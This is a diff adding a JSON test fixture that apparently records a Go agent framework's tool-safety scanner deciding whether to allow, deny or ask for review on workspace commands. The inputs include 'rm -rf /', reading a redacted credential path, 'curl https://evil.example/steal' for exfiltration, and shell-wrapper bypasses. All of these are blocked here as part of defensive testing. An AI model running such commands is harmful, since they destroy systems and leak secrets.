@@ -1,0 +1,288 @@
+[
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "go test ./tool/safety",
+    "decision": "allow",
+    "risk_level": "low",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [],
+    "recommendation": "allowed by the configured safety policy",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "rm -rf /",
+    "decision": "deny",
+    "risk_level": "critical",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-CMD-001",
+        "risk_type": "dangerous_command",
+        "risk_level": "critical",
+        "evidence": "rm -rf /",
+        "recommendation": "remove recursive destructive deletes or narrow them to safe workspace paths",
+        "decision": "deny"
+      },
+      {
+        "rule_id": "TSG-SHELL-001",
+        "risk_type": "command_policy",
+        "risk_level": "high",
+        "evidence": "command \"rm\" is denied by denied_commands",
+        "recommendation": "use an allowlisted command or an auditable workspace script",
+        "decision": "deny"
+      },
+      {
+        "rule_id": "TSG-PATH-001",
+        "risk_type": "sensitive_path",
+        "risk_level": "critical",
+        "evidence": "rm -rf /",
+        "recommendation": "do not access host credentials, dot-env files, or protected system paths",
+        "decision": "deny"
+      }
+    ],
+    "recommendation": "blocked before execution; remove high-risk behavior or update policy after review",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "cat [SENSITIVE_PATH]/[SENSITIVE_PATH]",
+    "decision": "deny",
+    "risk_level": "critical",
+    "blocked": true,
+    "redacted": true,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-PATH-001",
+        "risk_type": "sensitive_path",
+        "risk_level": "critical",
+        "evidence": "cat [SENSITIVE_PATH]/[SENSITIVE_PATH]",
+        "recommendation": "do not access host credentials, dot-env files, or protected system paths",
+        "decision": "deny"
+      }
+    ],
+    "recommendation": "blocked before execution; remove high-risk behavior or update policy after review",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "curl https://evil.example/steal",
+    "decision": "deny",
+    "risk_level": "critical",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-NET-001",
+        "risk_type": "network_egress",
+        "risk_level": "critical",
+        "evidence": "https://evil.example/steal",
+        "recommendation": "add the domain to allowed_domains or remove the outbound network call",
+        "decision": "deny"
+      }
+    ],
+    "recommendation": "blocked before execution; remove high-risk behavior or update policy after review",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "curl https://github.com/trpc-group/trpc-agent-go",
+    "decision": "allow",
+    "risk_level": "low",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [],
+    "recommendation": "allowed by the configured safety policy",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "sh -c \"echo hi\"",
+    "decision": "ask",
+    "risk_level": "high",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-SHELL-001",
+        "risk_type": "shell_bypass",
+        "risk_level": "high",
+        "evidence": "command \"sh\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., ...",
+        "recommendation": "use an allowlisted command or an auditable workspace script",
+        "decision": "ask"
+      },
+      {
+        "rule_id": "TSG-SHELL-002",
+        "risk_type": "shell_bypass",
+        "risk_level": "high",
+        "evidence": "sh -c \"echo hi\"",
+        "recommendation": "avoid shell wrappers, command substitution, eval, and redirection",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "cat go.mod | wc -l",
+    "decision": "ask",
+    "risk_level": "medium",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-SHELL-003",
+        "risk_type": "shell_pipeline",
+        "risk_level": "medium",
+        "evidence": "cat go.mod | wc -l",
+        "recommendation": "review multi-segment commands because pipes can hide data movement",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "go install example.com/tool@latest",
+    "decision": "ask",
+    "risk_level": "high",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-DEP-001",
+        "risk_type": "dependency_or_environment_change",
+        "risk_level": "high",
+        "evidence": "go install example.com/tool@latest",
+        "recommendation": "preinstall dependencies in a controlled image or require approval",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "sleep 120",
+    "decision": "ask",
+    "risk_level": "medium",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-RES-001",
+        "risk_type": "resource_abuse",
+        "risk_level": "medium",
+        "evidence": "sleep 120",
+        "recommendation": "keep tool executions short or raise max timeout explicitly",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "yes",
+    "decision": "ask",
+    "risk_level": "high",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-RES-002",
+        "risk_type": "resource_abuse",
+        "risk_level": "high",
+        "evidence": "yes",
+        "recommendation": "avoid unbounded output or loops before execution",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "hostexec_exec_command",
+    "backend": "hostexec",
+    "command": "go test ./...",
+    "decision": "ask",
+    "risk_level": "high",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-HOST-001",
+        "risk_type": "host_execution",
+        "risk_level": "high",
+        "evidence": "tty=true",
+        "recommendation": "host TTY sessions require human review because they can persist state",
+        "decision": "ask"
+      },
+      {
+        "rule_id": "TSG-HOST-001",
+        "risk_type": "host_execution",
+        "risk_level": "high",
+        "evidence": "background=true",
+        "recommendation": "background host processes require review and cleanup guarantees",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  },
+  {
+    "tool_name": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "echo $(whoami)",
+    "decision": "ask",
+    "risk_level": "high",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "rule_id": "TSG-PARSE-001",
+        "risk_type": "shell_parse",
+        "risk_level": "high",
+        "evidence": "command substitution '$(...)' is not allowed",
+        "recommendation": "rewrite command without shell expansion, redirection, wrappers, or substitutions",
+        "decision": "ask"
+      },
+      {
+        "rule_id": "TSG-SHELL-002",
+        "risk_type": "shell_bypass",
+        "risk_level": "high",
+        "evidence": "echo $(whoami)",
+        "recommendation": "avoid shell wrappers, command substitution, eval, and redirection",
+        "decision": "ask"
+      }
+    ],
+    "recommendation": "requires human review before execution",
+    "scanned_at": "1970-01-01T00:00:00Z"
+  }
+]
